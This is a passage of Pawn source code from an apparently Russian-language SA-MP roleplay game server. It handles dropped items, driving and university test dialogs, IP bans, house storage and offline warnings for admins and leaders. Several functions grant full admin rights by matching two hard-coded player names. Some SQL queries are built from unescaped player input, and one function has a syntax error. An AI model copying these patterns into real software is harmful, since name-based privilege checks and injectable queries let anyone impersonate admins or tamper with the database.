				case 11:{model=322;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 12:{model=323;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 13:{model=324;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 14:{model=325;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 15:{model=326;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 16:{model=342;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 17:{model=343;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 18:{model=344;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 19:{model=346;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 20:{model=347;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 21:{model=348;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 22:{model=349;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 23:{model=350;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 24:{model=351;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 25:{model=352;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 26:{model=353;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 27:{model=355;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 28:{model=356;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 29:{model=372;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 30:{model=357;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 31:{model=358;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 32:{model=359;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 33:{model=360;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 34:{model=361;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 35:{model=362;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 36:{model=365;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 37:{model=366;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 38:{model=367;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 39:{model=371;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 40..42:{model=2969;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 43:{model=1214;pdz[0]=-0.9;pdz[1]=0;pdz[2]=-90.0;pdz[3]=0;}
				case 44:{model=1578;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 45:{model=2969;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 46:{model=2969;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 47:{model=18870;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 48:{model=2969;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 49:{model=1650;pdz[0]=-0.7;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 50..69:{model=10270;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 70..79:{model=1546;pdz[0]=-0.91;pdz[1]=0;pdz[2]=0;pdz[3]=0;}

				case 80,82:{model=1546;pdz[0]=-0.94;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 100..103:{model=1546;pdz[0]=-0.91;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 211:{model=19793;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 113..117:{model=1486;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 118..120:{model=1951;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 130..134:{model=19897;pdz[0]=-0.99;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 122:{model=18874;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 123:{model=18873;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 124:{model=18871;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 125:{model=18870;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 126:{model=327;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 138..140:{model=19942;pdz[0]=-0.98;pdz[1]=-90;pdz[2]=0;pdz[3]=0;}
				case 87:{model=19569;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		        case 88:{model=19570;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 223:{model=11747;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 210:{model=3130;pdz[0]=-0.59;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				case 214..219:{model=1650;pdz[0]=-0.7;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
				default:{model=2969;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
			}
			DropItem[num][dObject]=CreateDynamicObject(model,DropItem[num][dX],DropItem[num][dY],DropItem[num][dZ]+pdz[0],pdz[1],pdz[2],pdz[3],DropItem[num][dWorld],DropItem[num][dInt]);
			new string[140];
			switch(DropItem[num][dIDItem])
			{
				case 1..41:format(string,sizeof(string),"%s\n{FFFFFF}'C' чтобы подобрать",Item[DropItem[num][dIDItem]][iName]);
				default:format(string,sizeof(string),"%s\n{FFFFFF}В количестве %i\n'C' чтобы подобрать",Item[DropItem[num][dIDItem]][iName],DropItem[num][dPiece]);
			}
			DropItem[num][dText]=CreateDynamic3DTextLabel(string, 0xFFFFFFFF, DropItem[num][dX],DropItem[num][dY],DropItem[num][dZ]-0.9, 1.1,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,DropItem[num][dWorld],DropItem[num][dInt]);
			DropItem[num][dTime] = gettime() + 5*60;
		}
    }
   	printf("[Загружено итемов]: <%i>. Потрачено: <%i мс>",id,GetTickCount()-time);
    return true;
}

forward SaveDropItem(d);
public SaveDropItem(d)
{
	//new string[45];
	//format(string,sizeof(string),"UPDATE "T_DROPIT" SET "),strcat(query,string);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL,sizeof(STRING_GLOBAL),"UPDATE "T_DROPIT" SET `IDItem`='%i', `Piece`='%i', `Value`='%s', `Int`='%i', `World`='%i', `X`='%f', `Y`='%f', `Z`='%f' WHERE `Number` = '%i'",DropItem[d][dIDItem],DropItem[d][dPiece],DropItem[d][dValue],DropItem[d][dInt],DropItem[d][dWorld],DropItem[d][dX],DropItem[d][dY],DropItem[d][dZ],d);
    mysql_query(dbHandle ,STRING_GLOBAL);
    return true;
}

stock PlayerDropItemId(playerid,iditem,piece,s=0,vid=0)
{
	if(piece==0)return true;
	new id = 0;// проверка на свободную ячейку
	for(new i = 999; i >= 0; i --)
	{
		if(DropItem[i][dIDItem]<=0){id=i;break;}
		else continue;
	}
	new Float:p[3];
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	DropItem[id][dX]=p[0];
	DropItem[id][dY]=p[1];
	DropItem[id][dZ]=p[2];
	DropItem[id][dIDItem]=iditem;
	DropItem[id][dPiece]=piece;
	DropItem[id][dWorld]=GetPlayerVirtualWorld(playerid);
	DropItem[id][dInt]=GetPlayerInterior(playerid);
	switch(vid)
	{
		case 0:format(DropItem[id][dValue],32,"%s",PlayerItem3[playerid][s]);
	}
	ApplyAnimation(playerid,"GRENADE","WEAPON_throwu",4.1,0,0,0,0,270);
	new str[70];
	format(str, sizeof(str), "INSERT INTO "T_DROPIT" (`Number`) VALUES ('%i')",id);
	mysql_tquery(dbHandle, str, "SaveDropItem","i",id);
	new model,Float:pdz[4];
	switch(iditem)
	{
	    case 1:{model=331;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 2:{model=333;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 3:{model=334;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 4:{model=335;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 5:{model=336;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 6:{model=337;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 7:{model=338;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 8:{model=339;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 9:{model=341;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 10:{model=321;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 11:{model=322;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 12:{model=323;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 13:{model=324;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 14:{model=325;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 15:{model=326;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 16:{model=342;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 17:{model=343;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 18:{model=344;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 19:{model=346;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 20:{model=347;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 21:{model=348;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 22:{model=349;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 23:{model=350;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 24:{model=351;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 25:{model=352;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 26:{model=353;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 27:{model=355;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 28:{model=356;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 29:{model=372;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 30:{model=357;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 31:{model=358;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 32:{model=359;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 33:{model=360;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 34:{model=361;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 35:{model=362;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 36:{model=365;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 37:{model=366;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 38:{model=367;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 39:{model=371;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
		case 40..42:{model=2969;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 43:{model=1214;pdz[0]=-0.9;pdz[1]=0;pdz[2]=-90.0;pdz[3]=0;}
		case 44:{model=1578;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 45:{model=2969;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 46:{model=2969;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 47:{model=18870;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 48:{model=2969;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 49:{model=1650;pdz[0]=-0.7;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 50..69:{model=10270;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 70..79:{model=1546;pdz[0]=-0.91;pdz[1]=0;pdz[2]=0;pdz[3]=0;}

		case 80,82:{model=1546;pdz[0]=-0.94;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 100..103:{model=1546;pdz[0]=-0.91;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 211:{model=19793;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 113..117:{model=1486;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 118..120:{model=1951;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 130..134:{model=19897;pdz[0]=-0.99;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 122:{model=18874;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 123:{model=18873;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 124:{model=18871;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 125:{model=18870;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 126:{model=327;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 138..140:{model=19942;pdz[0]=-0.98;pdz[1]=-90;pdz[2]=0;pdz[3]=0;}
		case 87:{model=19569;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
        case 88:{model=19570;pdz[0]=-1.0;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 223:{model=11747;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 210:{model=3130;pdz[0]=-0.59;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		case 214..219:{model=1650;pdz[0]=-0.7;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
		default:{model=2969;pdz[0]=-0.9;pdz[1]=0;pdz[2]=0;pdz[3]=0;}
	}
	DropItem[id][dObject]=CreateDynamicObject(model,p[0],p[1],p[2]+pdz[0],pdz[1],pdz[2],pdz[3],DropItem[id][dWorld],DropItem[id][dInt]);
	new string[140];
	switch(iditem)
	{
	    case 1..41:format(string,sizeof(string),"%s\n{FFFFFF}'C' чтобы подобрать",Item[DropItem[id][dIDItem]][iName]);
		default:format(string,sizeof(string),"%s\n{FFFFFF}В количестве %i\n'C' чтобы подобрать",Item[DropItem[id][dIDItem]][iName],DropItem[id][dPiece]);
	}
	DropItem[id][dText]=CreateDynamic3DTextLabel(string, 0xFFFFFFFF, p[0],p[1],p[2]-0.9, 1.1,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,DropItem[id][dWorld],DropItem[id][dInt]);
	DropItem[id][dTime] = gettime() + 5*60;
	return true;
}

public OnPlayerSelectObject(playerid, type, objectid, modelid, Float:fX, Float:fY, Float:fZ)
{
    return 1;
}


stock ShowUnTestQuestion(playerid,begin,end,dialogid,q=-1)
{
	if(q == -1) q = RandomEx(begin,end);
	pTemp[playerid][pUnTestQNumber] = q;
	new mes[256];
	format(mes,sizeof(mes),"%s\n1.%s\n2.%s\n3.%s\n4.%s",gUniverQuestions[q],gUniverExamAnswers[q][0],gUniverExamAnswers[q][1],gUniverExamAnswers[q][2],gUniverExamAnswers[q][3]);
	ShowPlayerDialog(playerid,dialogid,2,"Университет | Тест",mes,"Далее","Отмена");
	return 1;
}

stock ShowTestQuestion(playerid,begin,end,dialogid,q=-1)
{
	if(q == -1) q = RandomEx(begin,end);
	pTemp[playerid][pTestQNumber] = q;
	new mes[256];
	format(mes,sizeof(mes),"%s\n1.%s\n2.%s\n3.%s\n4.%s",gExamQuestions[q],gExamAnswers[q][0],gExamAnswers[q][1],gExamAnswers[q][2],gExamAnswers[q][3]);
	ShowPlayerDialog(playerid,dialogid,2,"Школа вождения",mes,"Далее","Отмена");
	return 1;
}

stock BanSet(playerid)
{
    if(!IsPlayerConnected(playerid)) return 0;

	new strban[256],
	    ip3[16],
		paiko;

    GetPlayerIp(playerid, ip3, 16);
	for(new fh = 0; fh < strlen(ip3); fh++)
	{
        if(ip3[fh]=='.'&&paiko+1==2)
		strdel(ip3,fh+1,strlen(ip3));
		if(ip3[fh]=='.'&&paiko+1<2)
		paiko++;
	}
    format(strban, sizeof(strban), "banip %s*.*", ip3);
	SendRconCommand(strban);
	return 1;
}

stock ShowCupboard(playerid)
{
	ShowPlayerDialog(playerid, DIALOG_CUPBOARD, DIALOG_STYLE_LIST, "{FFCC00}Шкаф",
	"{0099FF}1. {FFFFFF}Взять деньги\n\
	{0099FF}2. {FFFFFF}Положить деньги\n\
	{0099FF}3. {FFFFFF}Взять патроны\n\
	{0099FF}4. {FFFFFF}Положить патроны\n\
	{0099FF}5. {FFFFFF}Взять наркотики\n\
	{0099FF}6. {FFFFFF}Положить наркотики", "Далее", "Отмена");
	return 1;
}

stock UpdateCupboard(cupboardid)
{
	DestroyDynamic3DTextLabel(HouseInfo[cupboardid][hCupboardText]);
	new fmt_text[130];
	format(fmt_text, sizeof fmt_text, "{FFFFFF}Деньги: {66CC00}%d\n{FFFFFF}Патроны: {A52A2A}%d\n{FFFFFF}Наркотики: {0099FF}%d\n\n{FFFFFF}Взаимодействие: /use",
	HouseInfo[cupboardid][hMoney], HouseInfo[cupboardid][hPatrons],HouseInfo[cupboardid][hDrugs]);
	HouseInfo[cupboardid][hCupboardText] = CreateDynamic3DTextLabel(fmt_text, 0x0099FFFF, housecupboard[HouseInfo[cupboardid][hDiscript]][0], housecupboard[HouseInfo[cupboardid][hDiscript]][1], housecupboard[HouseInfo[cupboardid][hDiscript]][2],
	5.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, HouseInfo[cupboardid][hVirtual], HouseInfo[cupboardid][hInt], -1, 5.0);
    return 1;
}


stock IsTextNumeric(text[])
{
	if(strfind(text, "0", true) != -1) return 1;
	if(strfind(text, "1", true) != -1) return 1;
	if(strfind(text, "2", true) != -1) return 1;
	if(strfind(text, "3", true) != -1) return 1;
	if(strfind(text, "4", true) != -1) return 1;
	if(strfind(text, "5", true) != -1) return 1;
	if(strfind(text, "6", true) != -1) return 1;
	if(strfind(text, "7", true) != -1) return 1;
	if(strfind(text, "8", true) != -1) return 1;
	if(strfind(text, "9", true) != -1) return 1;
	return 0;
}

stock IsPlayerGrandAdmin(playerid)
{
	if(PI[playerid][pAdmin] < 0) return 0;

    if(GetString(GetName(playerid), "Artemy_Kovalevsky")
	|| GetString(GetName(playerid), "Gambler"))
	return true;

	new fmt_query[70];
	new rows;
	new Cache: result;

	format(fmt_query, sizeof fmt_query, "SELECT * FROM fullaccess WHERE name='%s'", GetName(playerid));
	result = mysql_query(dbHandle, fmt_query);

	rows = cache_num_rows();

	if(rows)
	{
		cache_delete(result);
		return 1;
	}
	else
	{
		cache_delete(result);
		return 0;
	}
}

stock IsPlayerMainAdmin(playerid)
{
	// основа
    if(GetString(GetName(playerid), "Artemy_Kovalevsky")
	|| GetString(GetName(playerid), "Gambler"))
	return true;

	return false;
}

stock IsPlayerDeveloperAdmin(playerid)
{
    if(GetString(GetName(playerid), "Artemy_Kovalevsky")
	|| GetString(GetName(playerid), "Gambler"))
		return true;

	return false;
}

stock IsPlayerGrandLeader(playerid)
{
    if(GetString(GetName(playerid), "Artemy_Kovalevsky"))
    || GetString(GetName(playerid), "Gambler"))
        return true;
	return false;
}

/*forward remove_build(playerid);
public remove_build(playerid)
{

    new obj_status, r, f;
    cache_get_data(r,f);

    obj_status = cache_get_field_content_int(0, "del_obj");

	if(obj_status != 1) RemoveBuild(playerid);

    STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET del_obj = '0' WHERE name = '%s'", GetName(playerid));
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

	return true;

}*/


forward ActivateAccount(playerid, name[]);
public ActivateAccount(playerid, name[])
{
	new r, f;
	cache_get_data(r, f);
	if(!r) return SendClientMessage(playerid, -1, "Аккаунт этого игрока не деактивирован или его нет в базе данных");

    STRING_GLOBAL[0] = EOS;
	mysql_format(dbHandle, STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET `deactivate` = '0' WHERE `name` = '%s'", name);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[A] Администратор %s активировал аккаунт игрока %s", GetName(playerid), name);
	SendAdminMessage(COLOR_GREY, STRING_GLOBAL);
	return true;
}

forward OffWarnLeader(playerid, name[]);
public OffWarnLeader(playerid, name[])
{
    new player_lvl, strings[128], string1[128], string[128], warn_count;
	new r, f;
	cache_get_data(r, f);
	if(!r) return SendClientMessage(playerid, -1, "Аккаунта этого игрока нет в базе");

	warn_count = cache_get_row_int(0, 159, dbHandle);
    player_lvl = cache_get_row_int(0, 16, dbHandle);

	if(player_lvl == 0) return SendClientMessage(playerid, -1, "Этот игрок не лидер");

	warn_count ++;

	if(warn_count < 3) format(string, sizeof(string), "Администратор %s выдал OFFLINE выговор лидеру %s [%i/3]", GetName(playerid), name, warn_count);
	else
	{

		mysql_format(dbHandle, string1, sizeof(string1), "UPDATE "T_ACCOUNTS" SET `leader` = '0', `member` = '0', `rank` = '0', `lwarn` = '0' WHERE `name` = '%s'", name);
		mysql_tquery(dbHandle, string1, "", "");

		format(string, sizeof string, "[A] Лидер %s получил 3 выговора от администратора %s и был снят с поста", name, GetName(playerid));
	}

	SendAdminMessage(COLOR_RED, string);

	mysql_format(dbHandle, strings, sizeof(strings), "UPDATE "T_ACCOUNTS" SET `lwarn` = '%d' WHERE `name` = '%s'", warn_count, name);
	mysql_tquery(dbHandle, strings, "", "");

	return true;
}

forward OffWarnAdmin(playerid, name[]);
public OffWarnAdmin(playerid, name[])
{
    new player_lvl, strings[128], string[128], string1[128], admin_count;
	new r, f;
	cache_get_data(r, f);
	if(!r) return SendClientMessage(playerid, -1, "Аккаунта этого игрока нет в базе");


    admin_count = cache_get_row_int(0, 160, dbHandle);
    player_lvl = cache_get_row_int(0, 6, dbHandle);

	if(player_lvl == 0) return SendClientMessage(playerid, -1, "Этот игрок не администратор");

	admin_count ++;

	if(admin_count < 3) format(string1, sizeof(string1), "Руководитель %s выдал OFFLINE выговор администратору %s [%i/3]", GetName(playerid), name, admin_count);
	else
	{

		if(GetPlayerID(name) != INVALID_PLAYER_ID) PI[GetPlayerID(name)][pAdmin] = 0;
		mysql_format(dbHandle, string, sizeof(string), "DELETE FROM "T_ADMIN" WHERE `name`='%s'", name);
		mysql_tquery(dbHandle, string, "", "");
		mysql_format(dbHandle, string, sizeof(string), "UPDATE "T_ACCOUNTS" SET `admin` = '0', `awarn` = '0' WHERE `name` = '%s'", name);
		mysql_tquery(dbHandle, string, "", "");

		format(string1, sizeof string1, "[A] Администратор %s получил 3 выговора от руководителя %s и был снят с поста", name, GetName(playerid));
	}


	SendAdminMessage(COLOR_RED, string1);

	mysql_format(dbHandle, strings, sizeof(strings), "UPDATE "T_ACCOUNTS" SET `awarn` = '%d' WHERE `name` = '%s'", admin_count,  name);
	mysql_tquery(dbHandle, strings, "", "");
	return true;
}

forward OffUNWarnLeader(playerid, name[]);
public OffUNWarnLeader(playerid, name[])
{
	new string1[128], string[128], warn_count, r, f;
	cache_get_data(r, f);
	if(!r) return SendClientMessage(playerid, -1, "Аккаунта этого игрока нет в базе, либо он не лидер");

	warn_count = cache_get_row_int(0, 159, dbHandle);

	warn_count --;

	if(warn_count == 0) SendClientMessage(playerid, -1, "У данного лидера нет ни одного выговора");
	else
	{

		mysql_format(dbHandle, string1, sizeof(string1), "UPDATE "T_ACCOUNTS" SET `lwarn` = '%d' WHERE `name` = '%s'", warn_count, name);
		mysql_tquery(dbHandle, string1, "", "");

		format(string, sizeof string, "[A] Администратор %s OFFLINE снял выговор с лидера %s", GetName(playerid), name);
	}
	return true;
}

forward OffUNWarnAdmin(playerid, name[]);
public OffUNWarnAdmin(playerid, name[])
{
	new string1[128], string[128], warn_count, r, f;
	cache_get_data(r, f);
	if(!r) return SendClientMessage(playerid, -1, "Аккаунта этого игрока нет в базе, либо он не администратор");

	warn_count = cache_get_row_int(0, 160, dbHandle);

	warn_count --;

	if(warn_count == 0) SendClientMessage(playerid, -1, "У данного администратора нет ни одного выговора");
	else
	{

		mysql_format(dbHandle, string1, sizeof(string1), "UPDATE "T_ACCOUNTS" SET `awarn` = '%d' WHERE `name` = '%s'", warn_count, name);
		mysql_tquery(dbHandle, string1, "", "");

		format(string, sizeof string, "[A] Руководитель %s OFFLINE снял выговор с администратора %s", GetName(playerid), name);
	}
	return true;
}
/*stock ShowPlayerAutoSalonInfo(playerid, vehicleid)
{
	static const gText[] =
	{
		"{FF8C00}Данное транспортное средство находится на продаже.\n\n\
		{FFFFFF}Название транспорта: {FF0000}%s (модель - %d)\n\
		{FFFFFF}Цена для покупки: {FF0000}%d {FFFFFF}р\n\n\
		Пожалуйста, нажмите на кнопку 'Купить' для приобретения.\n\
		Либо нажмите на кнопку 'Отмена' для выхода из транспорта.\n"
	};
	new model = g_vehicle[vehicleid][veh_model];
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, gText, VehicleNames[model-400], model, g_vehicle[vehicleid][veh_price]);
	ShowPlayerDialog(playerid, D_AUTOSALON, DIALOG_STYLE_MSGBOX, "{FF8C00}Автосалон", STRING_GLOBAL, "Купить", "Отмена");
	return 1;
}*/
stock ShowPlayerMainMenu(playerid)
{
	new fmt_info[130], text[35], house_text[35];

	format(fmt_info, sizeof fmt_info, "имя:_%s~n~опыт:_%d/%d~n~возраст:_%d~n~предупреждения:_%d", GetName(playerid), PI[playerid][pExp], (PI[playerid][pLevel]+1)*2, PI[playerid][pAge], PI[playerid][pWarn]);
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][13], fmt_info);

	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][18], "");

	format(fmt_info, sizeof fmt_info, "военный_билет:_%s~n~законопослушность:_%d~n~розыск:_%d~n~номер_телефона:_%d", PI[playerid][pVoennik] == 1 ? ("есть") : ("нет"), PI[playerid][pZakon], PI[playerid][pWanted], PI[playerid][pPhoneNumber]);
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][14], fmt_info);

	if(PI[playerid][pMarried] == 0) format(text, sizeof text, "Нет");
	else format(text, sizeof text, "%s", PI[playerid][pWhoMarried]);

	format(fmt_info, sizeof fmt_info, "%s_на:_%s~n~пол:_%s~n~работа:_%s~n~орг.:_%s", PI[playerid][pSex] == 1 ? ("женат_на") : ("замужем_за"), text, PI[playerid][pSex] == 1 ? ("Мужской") : ("Женский"), Job_Names[PI[playerid][pJob]], PI[playerid][pMember] == 0 ? ("Нет") : Fraction_Name[PI[playerid][pMember]]);
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][15], fmt_info);

	if(GetPlayerBizz(playerid) == 0) format(text, sizeof text, "Нет");
	else format(text, sizeof text, "%s (%d)", BizzInfo[GetPVarInt(playerid, "PlayerBizz")][bName], GetPVarInt(playerid, "PlayerBizz"));

	if(GetPlayerHouse(playerid) == 0) format(house_text, sizeof house_text, "Нет");
